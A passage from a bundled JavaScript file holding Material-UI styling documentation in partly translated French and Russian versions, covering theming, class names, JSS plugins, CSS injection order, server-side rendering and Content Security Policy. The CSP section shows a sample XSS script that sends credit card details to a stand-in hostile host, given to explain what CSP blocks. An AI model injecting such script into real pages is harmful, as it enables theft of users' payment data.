'@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## CSS global\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Politique de s\xe9curit\xe9 du contenu (CSP)\n\n### Qu'est-ce que le CSP et en quoi est-ce utile ?\n\nFondamentalement, CSP att\xe9nue les attaques XSS (Cross-Site Scripting) en obligeant les d\xe9veloppeurs \xe0 ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoy\xe9e en tant qu'en-t\xeate du serveur. Par exemple, disons que vous avez un site h\xe9berg\xe9 \xe0 ` https://example.com ` l'en-t\xeate CSP ` default-src: 'self'; ` autorisera toutes les requ\xeates \xe0 destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vuln\xe9rable au XSS dans laquelle une entr\xe9e d'utilisateur non \xe9chapp\xe9e est affich\xe9e, un attaquant pourrait saisir quelque chose du genre :\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nCette vuln\xe9rabilit\xe9 permettrait \xe0 l'attaquant d'ex\xe9cuter n'importe quoi. Cependant, avec un en-t\xeate CSP s\xe9curis\xe9, le navigateur ne chargera pas ce script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Comment met-on en place un CSP?\n\nPour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un \"nonce\". A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/master/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aper\xe7u de base, continuez \xe0 lire.\n\nUn nonce CSP est une cha\xeene cod\xe9e en Base 64. Vous pouvez en g\xe9n\xe9rer un comme ceci:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nIt is very important that you use UUID version 4, as it generates an **unpredictable** string. Vous appliquez ensuite ce nonce \xe0 l'en-t\xeate CSP. Un en-t\xeate CSP pourrait ressembler \xe0 ceci avec le nonce appliqu\xe9:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nIf you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nEnsuite, vous devez transmettre ce nonce \xe0 JSS afin qu\u2019il puisse l\u2019ajouter aux balises `<style>` suivantes.\n\nThe way that you do this is by passing a `<meta property=\"csp-nonce\" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property=\"csp-nonce\"` tag and use the `content` value as the nonce.\n\nVous devez inclure cet en-t\xeate, que le SSR soit utilis\xe9 ou non. Here is an example of what a fictional header could look like:\n\n```html\n<head>\n  <meta property=\"csp-nonce\" content=\"this-is-a-nonce-123\" />\n</head>\n```"},QW0H:function(e,n){e.exports="# \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b\n\n<p class=\"description\">\u0412 \u044d\u0442\u043e\u043c \u0440\u0430\u0437\u0434\u0435\u043b\u0435 \u043e\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u0431\u043e\u043b\u0435\u0435 \u0441\u043b\u043e\u0436\u043d\u043e\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 @material-ui/core/styles.</p>\n\n## \u0422\u0435\u043c\u0438\u0437\u0430\u0446\u0438\u044f\n\nAdd a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.\n\n> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createMuiTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/core/styles';\nimport DeepChild from './my_components/DeepChild';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### \u0414\u043e\u0441\u0442\u0443\u043f \u043a \u0442\u0435\u043c\u0435 \u0432 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u0435\n\n\u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0434\u043e\u0441\u0442\u0443\u043f \u043a \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u043c \u0442\u0435\u043c\u044b \u0432\u043d\u0443\u0442\u0440\u0438 \u0432\u0430\u0448\u0438\u0445 React-\u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442.\n\n#### `useTheme` hook\n\n\u0414\u043b\u044f \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u0430\u0445:\n\n```jsx\nimport { useTheme } from '@material-ui/core/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n\u0414\u043b\u044f \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0432 \u043a\u043b\u0430\u0441\u0441\u043e\u0432\u044b\u0445 \u0438\u043b\u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u0430\u0445:\n\n```jsx\nimport { withTheme } from '@material-ui/core/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### \u0412\u043b\u043e\u0436\u0435\u043d\u043d\u044b\u0435 \u0442\u0435\u043c\u044b\n\n\u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0442\u044c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e theme providers \u0434\u0440\u0443\u0433 \u0432 \u0434\u0440\u0443\u0433\u0430. \u042d\u0442\u043e \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0447\u0435\u043d\u044c \u043f\u043e\u043b\u0435\u0437\u043d\u043e \u043f\u0440\u0438 \u0440\u0430\u0431\u043e\u0442\u0435 \u0441 \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u043c\u0438 \u043e\u0431\u043b\u0430\u0441\u0442\u044f\u043c\u0438 \u0432\u0430\u0448\u0435\u0433\u043e \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043e\u0442\u043b\u0438\u0447\u0430\u044e\u0442\u0441\u044f \u0434\u0440\u0443\u0433 \u043e\u0442 \u0434\u0440\u0443\u0433\u0430.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\n\u0412\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u044f\u044f \u0442\u0435\u043c\u0430 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442 \u0432\u0430\u0448\u0443 **\u0432\u043d\u0435\u0448\u043d\u044e\u044e \u0442\u0435\u043c\u0443**. \u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0440\u0430\u0441\u0448\u0438\u0440\u0438\u0442\u044c \u0432\u043d\u0435\u0448\u043d\u044e\u044e \u0442\u0435\u043c\u0443, \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u0438\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u044e:\n\n```jsx\n<ThemeProvider theme={\u2026} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## \u041f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0441\u0442\u0438\u043b\u0435\u0439 - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### `withStyles`\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### `makeStyles`\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u043f\u043b\u0430\u0433\u0438\u043d\u044b \u0434\u043b\u044f \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u044f \u0441\u0432\u043e\u0435\u0433\u043e \u044f\u0434\u0440\u0430, \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u044f \u0432\u0430\u043c \u0432\u044b\u0431\u0438\u0440\u0430\u0442\u044c \u043d\u0443\u0436\u043d\u044b\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438, \u0438 \u043d\u0435\u0441\u0442\u0438 \u0438\u0437\u0434\u0435\u0440\u0436\u043a\u0438 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438 \u0442\u043e\u043b\u044c\u043a\u043e \u0437\u0430 \u0442\u0443 \u0444\u0443\u043d\u043a\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u0432\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0435.\n\n\u041d\u0435 \u0432\u0441\u0435 \u043f\u043b\u0430\u0433\u0438\u043d\u044b \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b \u0432 Material-UI \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e. \u0421\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0435 \u043f\u043b\u0430\u0433\u0438\u043d\u044b \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u044b \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e (\u043e\u043d\u0438 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0447\u0430\u0441\u0442\u044c\u044e [jss-preset-default](https://cssinjs.org/jss-preset-default/) ):\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. \u0412\u043e\u0442 \u043f\u0440\u0438\u043c\u0435\u0440 \u0441 \u043f\u043b\u0430\u0433\u0438\u043d\u043e\u043c [jss-rtl](https://github.com/alitaheri/jss-rtl).\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nexport default function App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n```\n\n## String templates\n\n\u0415\u0441\u043b\u0438 \u0432\u044b \u043f\u0440\u0435\u0434\u043f\u043e\u0447\u0438\u0442\u0430\u0435\u0442\u0435 CSS-\u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441 \u043d\u0430\u0434 JSS, \u0432\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043f\u043b\u0430\u0433\u0438\u043d [jss-plugin-template](https://cssinjs.org/jss-plugin-template/).\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\n\u041e\u0431\u0440\u0430\u0442\u0438\u0442\u0435 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435, \u0447\u0442\u043e \u044d\u0442\u043e \u0440\u0435\u0448\u0435\u043d\u0438\u0435 \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0435\u0442 \u0441\u0435\u043b\u0435\u043a\u0442\u043e\u0440\u044b \u0438\u043b\u0438 \u0432\u043b\u043e\u0436\u0435\u043d\u043d\u044b\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u0430.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## \u041f\u043e\u0440\u044f\u0434\u043e\u043a \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044f CSS\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/core/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/core/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // \ud83d\udd35\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // \ud83d\udd34\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red \ud83d\udd34 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML-\u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### Other HTML elements\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/core/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nexport default function App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it\u2019s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/core/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets` API documentation](/styles/api/#serverstylesheets).\n\n### Gatsby\n\nThere is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) for an up-to-date usage example.\n\n## \u0418\u043c\u0435\u043d\u0430 \u043a\u043b\u0430\u0441\u0441\u043e\u0432\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### \u041f\u043e-\u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n\nBy default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* \u2026 */ },\n  label: { /* \u2026 */ },\n  outlined: {\n    /* \u2026 */\n    '&$disabled': { /* \u2026 */ },\n  },\n  outlinedPrimary: {\n    /* \u2026 */\n    '&:hover': { /* \u2026 */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* \u2026 */ }\n.MuiButton-label { /* \u2026 */ }\n.MuiButton-outlined { /* \u2026 */ }\n.MuiButton-outlined.Mui-disabled { /* \u2026 */ }\n.MuiButton-outlinedPrimary: { /* \u2026 */ }\n.MuiButton-outlinedPrimary:hover { /* \u2026 */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; \ud83d\udc9a\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; \ud83d\udc94\n    }\n    &:hover fieldset {\n      border-color: yellow; \ud83d\udc9b\n    }\n    &.Mui-focused fieldset {\n      border-color: green; \ud83d\udc9a\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## \u0413\u043b\u043e\u0431\u0430\u043b\u044c\u043d\u044b\u0439 CSS\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Content Security Policy (CSP)\n\n### What is CSP and why is it useful?\n\nBasically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:\n\n```html\n<script>\n  